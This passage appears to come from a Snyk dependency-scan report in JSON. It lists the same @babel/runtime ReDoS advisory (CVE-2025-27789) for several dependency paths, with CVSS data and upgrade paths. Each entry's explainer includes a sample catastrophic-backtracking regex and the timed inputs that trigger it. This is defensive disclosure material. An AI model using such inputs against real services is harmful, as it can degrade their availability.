        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/styles@5.13.2",
          "jss-plugin-vendor-prefixer@10.10.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/styles@5.18.0",
          "jss-plugin-vendor-prefixer@10.10.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/react@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.11.0",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@emotion/styled@11.11.0",
          "@emotion/babel-plugin@11.13.5",
          "babel-plugin-macros@3.1.0",
          "@babel/runtime@7.28.4"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in the `replace()` method in `wrapRegExp.js`. An attacker can cause degradation in performance by supplying input strings that exploit the quadratic complexity of the replacement algorithm. \r\n\r\nThis is only exploitable when all of the following conditions are met: \r\n\r\n1) The code passes untrusted strings in the second argument to `.replace()`.\r\n\r\n2) The compiled regular expressions being applied contain named capture groups.\r\n\r\nIn the case of `@babel/preset-env`, if the `targets` option is in use the application will be vulnerable under either of the following conditions:\r\n\r\n1) A browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 is used when processing named capture groups.\r\n\r\n2) A browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 is used when processing duplicated named capture groups.\r\n\r\n\r\n**Note:** The project maintainers advise that \"just updating your Babel dependencies is not enough: you will also need to re-compile your code.\"\r\n\r\n## Workaround \r\n\r\n This vulnerability can be avoided by filtering out input containing a `$<` that is not followed by a `>`.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `@babel/runtime` to version 7.26.10, 8.0.0-alpha.17 or higher.\n## References\n- [GitHub Commit](https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4)\n- [GitHub Gist](https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838)\n- [GitHub PR](https://github.com/babel/babel/pull/17173)\n",
        "epssDetails": {
          "percentile": "0.15482",
          "probability": "0.00050",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2025-27789"
          ],
          "CWE": [
            "CWE-1333"
          ],
          "GHSA": [
            "GHSA-968p-4wvh-cqc8"
          ]
        },
        "packageName": "@babel/runtime",
        "proprietary": false,
        "creationTime": "2025-05-06T13:41:17.603509Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2025-03-11T20:30:18Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2025-05-06T13:41:18.028736Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-05-06T13:41:18.041033Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "@odlux/framework@0.1.4",
          "@mui/material@5.13.2",
          "@mui/base@5.0.0-beta.2",
          "@mui/utils@5.13.1",
          "@babel/runtime@7.22.0"
        ],
        "upgradePath": [
          false,
          "@mui/material@5.16.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "@babel/runtime",
        "version": "7.22.0"
      },
      {
        "id": "SNYK-JS-BABELRUNTIME-10044504",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "mmmsssttt404"
        ],
        "semver": {
          "vulnerable": [
            "<7.26.10",
            ">=8.0.0-alpha.0 <8.0.0-alpha.17"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "7.26.10",
          "8.0.0-alpha.17"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.9,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "@babel/runtime",
        "references": [
          {
            "url": "https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4",
            "title": "GitHub Commit"
          },
          {
            "url": "https://gist.github.com/mmmsssttt404/1f066ed9237f514714f2cc022d631838",
            "title": "GitHub Gist"
          },
          {
            "url": "https://github.com/babel/babel/pull/17173",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.9,
            "cvssVersion": "4.0",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.2,
            "cvssVersion": "3.1",
            "modificationTime": "2025-05-06T13:41:18.041033Z"
          }
        ],
